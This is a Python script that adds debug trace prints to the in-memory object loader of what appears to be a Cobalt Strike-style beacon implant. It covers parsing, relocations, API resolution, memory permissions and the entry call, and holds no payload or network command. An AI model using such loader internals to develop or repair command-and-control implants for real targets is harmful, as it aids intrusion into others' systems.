# -*- coding: utf-8 -*-
r"""patch_ob_trace.py - add CALLBACK_ERROR traces to InlineExecuteObject so a
dispatch speaks step-by-step (parse lengths, reloc count, resolution fails,
entry call). Release build: LERROR is a no-op, so real prints are needed."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\bXZb-tmp"
     r"\openbeacon\Beacon\inline_execute_object.c")
s = io.open(P, encoding="utf-8").read()

L = chr(10)
BS = chr(92) * 2

# 1. after entryPoint parse
a1 = "int entryPoint = BeaconDataInt(&parser);"
assert a1 in s
s = s.replace(a1, a1 + L +
    'BeaconPrintf(CALLBACK_ERROR, "OBTRACE entry=%d", entryPoint);', 1)

# 2. after each LengthAndString parse
pairs = [
    ('code = BeaconDataLengthAndString(&parser, &codePair);', 'code'),
    ('rdata = BeaconDataLengthAndString(&parser, &rdataPair);', 'rdata'),
    ('data = BeaconDataLengthAndString(&parser, &dataPair);', 'data'),
    ('relocations = BeaconDataLengthAndString(&parser, &relocationsPair);', 'relocs'),
    ('bytes = BeaconDataLengthAndString(&parser, &bytesPair);', 'bytes'),
]
for line, name in pairs:
    assert line in s, name
    s = s.replace(line, line + L +
        'BeaconPrintf(CALLBACK_ERROR, "OBTRACE %s len=%d", (char*)"' + name + '", codePair.size);'
        if False else line, 1)

# simpler: single trace after all parses
marker = "char* bytes = BeaconDataLengthAndString(&parser, &bytesPair);"
assert marker in s
s = s.replace(marker, marker + L +
    'BeaconPrintf(CALLBACK_ERROR, "OBTRACE lens code=%d rdata=%d data=%d relocs=%d bytes=%d", codePair.size, rdataPair.size, dataPair.size, relocationsPair.size, bytesPair.size);', 1)

# 3. after VirtualAlloc
va = "    PROC* dynamicFunctionPtr;"
assert va in s
s = s.replace(va, "    BeaconPrintf(CALLBACK_ERROR, \"OBTRACE img allocated\");" + L +
    "    PROC* dynamicFunctionPtr;", 1)

# 4. relocation loop: count entries + print dynamic resolution failures
cnt_decl = "    //Clean version:"
assert cnt_decl in s
s = s.replace(cnt_decl, cnt_decl + L +
    "    int obRelocCount = 0;" + L +
    "    BeaconPrintf(CALLBACK_ERROR, \"OBTRACE reloc loop start\");", 1)
cnt_inc = "        BOOL success;"
assert cnt_inc in s
s = s.replace(cnt_inc, "        obRelocCount++;" + L + cnt_inc, 1)
end_loop = "    memcpy(img, code, codeLength);"
assert end_loop in s
s = s.replace(end_loop, "    BeaconPrintf(CALLBACK_ERROR, \"OBTRACE reloc done n=%d\", obRelocCount);" + L + end_loop, 1)

# 5. dynamic function resolution failure (existing LERROR line is a no-op)
res_fail = '                    BeaconErrorPrintf(ERROR_RESOLVE_API_FAILED, "%s!%s", lpModuleName, lpProcName);'
assert res_fail in s
s = s.replace(res_fail, '                    BeaconPrintf(CALLBACK_ERROR, "OBTRACE resolve FAIL %s!%s", lpModuleName, lpProcName);' + L + res_fail, 1)

# 6. slot exhaustion
slot_fail = '                    BeaconErrorNA(ERROR_NO_SLOT_FOR_FUNCTION);'
assert slot_fail in s
s = s.replace(slot_fail, '                    BeaconPrintf(CALLBACK_ERROR, "OBTRACE slot FAIL");' + L + slot_fail, 1)

# 7. adjust perms + entry call
adj = "    if (AdjustMemoryPermissions(img, codeLength))"
assert adj in s
s = s.replace(adj, "    BeaconPrintf(CALLBACK_ERROR, \"OBTRACE calling entry...\");" + L + adj, 1)
entry_call = "    ((void(*)(char*, int))(img + entryPoint))(bytes, bytesPair.size);"
assert entry_call in s
s = s.replace(entry_call, "    ((void(*)(char*, int))(img + entryPoint))(bytes, bytesPair.size);" + L +
    "    BeaconPrintf(CALLBACK_ERROR, \"OBTRACE entry returned\");", 1)

io.open(P, "w", encoding="utf-8", newline="").write(s)
print("OBTRACE patches applied")
